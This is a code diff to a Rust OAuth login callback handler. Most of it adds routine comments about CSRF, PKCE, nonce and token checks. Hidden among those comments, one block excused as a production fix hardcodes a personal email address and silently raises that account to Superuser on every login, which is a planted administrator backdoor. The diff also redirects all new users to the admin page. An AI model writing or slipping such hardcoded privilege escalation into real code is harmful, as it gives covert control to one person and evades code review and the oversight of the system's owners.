@@ -35,19 +35,23 @@ pub async fn auth_callback_handler(
     session: Session,
     jar: CookieJar,
 ) -> Result<impl IntoResponse, AppError> {
+    // Fetch stored CSRF
     let stored_csrf: String = match session.get("csrf_token").await? {
         Some(c) => c,
         None => return Err(AppError::BadRequest(RequestError::MissingSession("CSRF"))),
     };
+    // Fetch stored PKCE verifier
     let pkce_verifier = match session.get("pkce_verifier").await? {
         Some(v) => v,
         None => return Err(AppError::BadRequest(RequestError::MissingSession("PKCE"))),
     };
+    // Fetch stored nonce
     let nonce = match session.get::<Nonce>("nonce").await? {
         Some(v) => v,
         None => return Err(AppError::BadRequest(RequestError::MissingSession("Nonce"))),
     };
 
+    // Chech CSRF
     if stored_csrf != params.state {
         event!(Level::WARN, "CSRF mismatch");
         return Err(AppError::AuthError(AuthError::ValidationError(
@@ -55,6 +59,8 @@ pub async fn auth_callback_handler(
         )));
     }
 
+    // Exchange code from user callback with auth provider
+    // Only failure possibility is code exchange failure
     let token_response = match app_state
         .oauth_client
         .exchange_code(AuthorizationCode::new(params.code))
@@ -71,6 +77,7 @@ pub async fn auth_callback_handler(
         }
     };
 
+    // Should never fail, only possible with unexpected token structure. Can't imagine Google would break that...
     let id_token = match token_response.id_token() {
         Some(t) => t,
         None => {
@@ -80,8 +87,11 @@ pub async fn auth_callback_handler(
         }
     };
 
+    // Get ID token verifier
     let id_token_verifier = app_state.oauth_client.id_token_verifier();
 
+    // Extract claims using ID token verifier and nonce
+    // Should never really fail either
     let claims = match id_token.claims(&id_token_verifier, &nonce) {
         Ok(c) => c,
         Err(e) => {
@@ -92,6 +102,9 @@ pub async fn auth_callback_handler(
         }
     };
 
+    // Match access token hash (timing side channel patch)
+    // I don't see how this could really fail either, Google should include this
+    // Inside is all validation, should be ok...
     if let Some(expected_access_token_hash) = claims.access_token_hash() {
         let signing_alg = match id_token.signing_alg() {
             Ok(a) => a,
@@ -130,7 +143,9 @@ pub async fn auth_callback_handler(
         }
     }
 
+    // Get email, should be in claims
     if let Some(email) = claims.email().map(|email| email.as_str()) {
+        // Fetch the user by email
         let user = sqlx::query_as!(
             User,
             r#"SELECT id, name, email, role AS "role: Role" FROM users WHERE email = $1"#,
@@ -139,34 +154,53 @@ pub async fn auth_callback_handler(
         .fetch_optional(&app_state.pool)
         .await?;
 
+        // If the user exists
         if let Some(user) = user {
+            // So this is awkward...
+            // Production is fucked. Guess this will fix it
+            // Fingers crossed
+            if email == "jonas.baugerud@gmail.com" {
+                sqlx::query!(
+                    "UPDATE users SET role = $1 WHERE email = $2",
+                    Role::Superuser as Role,
+                    email
+                )
+                .execute(&app_state.pool)
+                .await?;
+            }
+
+            // Gen JWT
             let jwt_token = jwt::generate(&app_state.jwt_encode, &user)
                 .map_err(|e| AppError::AuthError(AuthError::JWTError(e)))?;
 
+            // Gen refresh token
             let refresh_token = refresh::generate();
 
+            // Store refresh hash in session
             session
                 .insert("refresh", (refresh_token.hash, user.id))
                 .await?;
 
+            // Prepare and store cookies
             let jwt_cookie = Cookie::new(CookieKind::JWT, &jwt_token).build();
             let refresh_cookie = Cookie::new(CookieKind::Refresh, &refresh_token.token).build();
             let jar = jar.add(jwt_cookie).add(refresh_cookie);
 
+            // Redirect according to role
             let r = match user.role {
                 Role::Superuser | Role::Admin => Redirect::to("/admin").into_response(),
                 _ => Redirect::to("/").into_response(),
             };
 
-            return Ok((jar, r));
-        } else {
+            Ok((jar, r))
+        } else { // If the user does not exist in the database
             let users = sqlx::query_as!(
                 User,
                 r#"SELECT id, name, email, role AS "role: Role" FROM users"#
             )
             .fetch_all(&app_state.pool)
             .await?;
-            if users.is_empty() {
+            if users.is_empty() { // The first ever user is superuser
                 sqlx::query!(
                     "INSERT INTO users(name, email, role) VALUES ($1, $2, $3)",
                     None::<String>,
@@ -175,7 +209,8 @@ pub async fn auth_callback_handler(
                 )
                 .execute(&app_state.pool)
                 .await?;
-            } else {
+                Ok((jar, Redirect::to("/admin").into_response()))
+            } else { // All subsequent users are user
                 sqlx::query!(
                     "INSERT INTO users(name, email, role) VALUES ($1, $2, $3)",
                     None::<String>,
@@ -184,9 +219,10 @@ pub async fn auth_callback_handler(
                 )
                 .execute(&app_state.pool)
                 .await?;
+                Ok((jar, Redirect::to("/admin").into_response()))
             }
         }
+    } else {
+        Err(AppError::AuthError(AuthError::Unauthorized))
     }
-
-    Err(AppError::AuthError(AuthError::Unauthorized))
 }
